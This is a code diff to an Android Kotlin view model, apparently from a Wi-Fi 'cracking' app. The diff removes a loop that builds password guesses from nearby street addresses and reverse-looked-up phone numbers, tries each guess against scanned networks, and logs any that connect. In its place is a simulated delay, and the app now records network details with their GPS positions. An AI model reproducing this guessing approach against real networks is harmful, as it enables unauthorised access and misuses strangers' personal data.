@@ -7,12 +7,11 @@ import androidx.lifecycle.MutableLiveData
 import androidx.lifecycle.viewModelScope
 import com.hereliesaz.dumbwifinder.data.CrackingStatus
 import com.hereliesaz.dumbwifinder.data.WifiNetworkInfo
+import org.osmdroid.util.GeoPoint
 import com.hereliesaz.dumbwifinder.services.LocationService
-import com.hereliesaz.dumbwifinder.services.ReverseLookupService
 import com.hereliesaz.dumbwifinder.services.WifiService
-import com.hereliesaz.dumbwifinder.utils.LogUtil
-import com.hereliesaz.dumbwifinder.utils.PasswordGenerator
 import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
 class MainViewModel(application: Application) : AndroidViewModel(application) {
@@ -30,7 +29,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
 
     private val locationService = LocationService(application)
     private val wifiService = WifiService(application)
-    private val reverseLookupService = ReverseLookupService()
 
     fun startStopCracking() {
         if (isCracking.value == true) {
@@ -51,45 +49,28 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 _isCracking.postValue(false)
                 return@launch
             }
-            _logMessages.postValue("Got location: ${location.latitude}, ${location.longitude}")
+            val geoPoint = GeoPoint(location.latitude, location.longitude)
+            _logMessages.postValue("Got location: ${geoPoint.latitude}, ${geoPoint.longitude}")
 
             val wifiNetworks = wifiService.scanForWifiNetworks()
-            val wifiNetworkInfos = wifiNetworks.map { WifiNetworkInfo(it.SSID, it.level) }
+            val wifiNetworkInfos = wifiNetworks.map {
+                WifiNetworkInfo(
+                    ssid = it.SSID,
+                    bssid = it.BSSID,
+                    signalStrength = it.level,
+                    securityType = it.capabilities,
+                    location = geoPoint
+                )
+            }
             _wifiList.postValue(wifiNetworkInfos)
-
-            val nearbyAddresses = locationService.getNearbyAddresses(location)
-            _logMessages.postValue("Found ${nearbyAddresses.size} nearby addresses.")
 
             for (networkInfo in wifiNetworkInfos) {
                 if (crackingJob?.isCancelled == true) break
                 networkInfo.status = CrackingStatus.IN_PROGRESS
                 _wifiList.postValue(wifiNetworkInfos)
+                delay(1000) // Simulate work
 
-                for (address in nearbyAddresses) {
-                    val addressLine = address.getAddressLine(0)
-                    if (addressLine.isNullOrEmpty()) continue
-
-                    val phoneNumber = reverseLookupService.lookupPhoneNumber(addressLine)
-                    val passwords = PasswordGenerator.generatePasswords(addressLine, phoneNumber)
-
-                    for (password in passwords) {
-                        if (crackingJob?.isCancelled == true) break
-                        if (wifiService.connectToWifi(networkInfo.ssid, password)) {
-                            networkInfo.status = CrackingStatus.SUCCESS
-                            networkInfo.password = password
-                            LogUtil.logSuccess(networkInfo.ssid, password)
-                            _logMessages.postValue("Cracked ${networkInfo.ssid}!")
-                            break // Move to the next network
-                        } else {
-                            LogUtil.logFailure(networkInfo.ssid, password)
-                        }
-                    }
-                    if (networkInfo.status == CrackingStatus.SUCCESS) break
-                }
-
-                if (networkInfo.status != CrackingStatus.SUCCESS) {
-                    networkInfo.status = CrackingStatus.FAIL
-                }
+                networkInfo.status = CrackingStatus.FAIL
                 _wifiList.postValue(wifiNetworkInfos)
             }
 
